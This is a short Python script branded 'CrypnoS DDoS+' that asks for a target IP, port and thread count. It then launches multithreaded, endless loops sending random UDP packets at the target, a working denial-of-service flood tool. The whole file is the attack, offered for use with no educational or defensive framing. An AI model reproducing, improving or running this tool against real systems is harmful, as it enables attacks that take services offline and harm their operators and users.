#Autor By Phoen1x
import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os
import getpass

os.system("clear")
print("""
⡀                                             ⡄
⢻⣦⡀              ⣀⣀⠤⠤⠴⢶⣶⡶⠶⠤⠤⢤⣀⡀            ⢀⣠⣾⠁
 ⠻⣯⡗⢶⣶⣶⣶⣶⢶⣤⣄⣀⣀⡤⠒⠋⠁    ⠚⢯⠟⠂    ⠉⠙⠲⣤⣠⡴⠖⣲⣶⡶⣶⣿⡟⢩⡴⠃
  ⠈⠻⠾⣿⣿⣬⣿⣾⡏⢹⣏⠉⠢⣄⣀⣀⠤⠔⠒⠊⠉⠉⠉⠉⠑⠒ ⠤⣀⡠⠚⠉⣹⣧⣝⣿⣿⣷⠿⠿⠛⠉
       ⠈⣹⠟⠛⠿⣿⣤⡀⣸⠿⣄           ⣠⠾⣇⢰⣶⣿⠟⠋⠉⠳⡄
      ⢠⡞⠁  ⡠⢾⣿⣿⣯ ⠈⢧⡀       ⢀⡴⠁⢀⣿⣿⣯⢼⠓⢄ ⢀⡘⣦⡀
     ⣰⣟⣟⣿⣀⠎  ⢳⠘⣿⣷⡀⢸⣿⣶⣤⣄⣀⣤⢤⣶⣿⡇⢀⣾⣿⠋⢀⡎  ⠱⣤⢿⠿⢷⡀
    ⣰⠋ ⠘⣡⠃   ⠈⢇⢹⣿⣿⡾⣿⣻⣖⠛⠉⠁⣠⠏⣿⡿⣿⣿⡏ ⡼    ⠘⢆  ⢹⡄
   ⢰⠇  ⣰⠃  ⣀⣀⣀⣼⢿⣿⡏⡰⠋⠉⢻⠳⣤⠞⡟ ⠈⢣⡘⣿⡿⠶⡧⠤⠄⣀⣀ ⠈⢆  ⢳
   ⡟  ⢠⣧⣴⣊⣩⢔⣠⠞⢁⣾⡿⢹⣷⠋ ⣸⡞⠉⢹⣧⡀⠐⢃⢡⢹⣿⣆⠈⠢⣔⣦⣬⣽⣶⣼⣄ ⠈⣇
  ⢸⠃ ⠘⡿⢿⣿⣿⣿⣛⣳⣶⣿⡟⣵⠸⣿⢠⡾⠥⢿⡤⣼⠶⠿⡶⢺⡟⣸⢹⣿⣿⣾⣯⢭⣽⣿⠿⠛⠏  ⢹
  ⢸   ⡇ ⠈⠙⠻⠿⣿⣿⣿⣇⣸⣧⣿⣦⡀ ⣘⣷⠇ ⠄⣠⣾⣿⣯⣜⣿⣿⡿⠿⠛⠉   ⢸  ⢸⡆
  ⢸   ⡇    ⣀⠼⠋⢹⣿⣿⣿⡿⣿⣿⣧⡴⠛ ⢴⣿⢿⡟⣿⣿⣿⣿ ⠙⠲⢤⡀   ⢸⡀ ⢸⡇
  ⢸⣀⣷⣾⣇ ⣠⠴⠋⠁  ⣿⣿⡛⣿⡇⢻⡿⢟⠁  ⢸⠿⣼⡃⣿⣿⣿⡿⣇⣀⣀⣀⣉⣓⣦⣀⣸⣿⣿⣼⠁
  ⠸⡏⠙⠁⢹⠋⠉⠉⠉⠉⠉⠙⢿⣿⣅ ⢿⡿⠦ ⠁ ⢰⡃⠰⠺⣿⠏⢀⣽⣿⡟⠉⠉⠉ ⠈⠁⢈⡇⠈⠇⣼
   ⢳   ⢧      ⠈⢿⣿⣷⣌⠧⡀⢲⠄  ⢴⠃⢠⢋⣴⣿⣿⠏       ⡸  ⢠⠇
   ⠈⢧  ⠈⢦      ⠈⠻⣿⣿⣧⠐⠸⡄⢠ ⢸ ⢠⣿⣟⡿⠋       ⡰⠁ ⢀⡟
    ⠈⢧   ⠣⡀      ⠈⠛⢿⡇⢰⠁⠸⠄⢸ ⣾⠟⠉       ⢀⠜⠁ ⢀⡞
     ⠈⢧⡀  ⠙⢄       ⢨⡷⣜   ⠘⣆⢻        ⡴⠋  ⣠⠎
       ⠑⢄   ⠑⠦⣀    ⠈⣷⣿⣦⣤⣤⣾⣿⢾     ⣀⠴⠋  ⢀⡴⠃
        ⠈⠑⢄⡀⢸⣶⣿⡑⠂⠤⣀⡀⠱⣉⠻⣏⣹⠛⣡⠏⢀⣀⠤⠔⢺⡧⣆ ⢀⡴⠋
           ⠉⠳⢽⡁    ⠈⠉⠙⣿⠿⢿⢿⠍⠉    ⠉⣻⡯⠛⠁
              ⠈⠑⠲⠤⣀⣀⡀ ⠈⣽⡟⣼ ⣀⣀⣠⠤⠒⠋⠁
                    ⠉⠉⠉⢻⡏⠉⠉⠁
                       ⠈
""")

print("CrypnoS DDoS+")
print("Tolls Have Problem? Message Me")
print("Tolls By Phoen1x")
ip = str(input("  \033[0;31mIP:"))
port = int(input(" \033[0;32mPort:"))
choice = str(input(" \033[32mMethods: "))
times = int(input(" \033[0;31mPacket:"))
threads = int(input(" \033[0;32mThreads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" CrypnoS ")
		except:
			print("[!] ERROR SERVER TIME OUT")
			
def run2():
	data = random._urandom(818)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" CrypnoS ")
		except:
			print("[!] ERROR SERVER TIME OUT")
			
def run3():
	data = random._urandom(818)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" CrypnoS ")
		except:
			print("[!] ERROR SERVER TIME OUT")
for y in range(threads):
	if choice == 'UDP':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
	if choice == 'udp':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
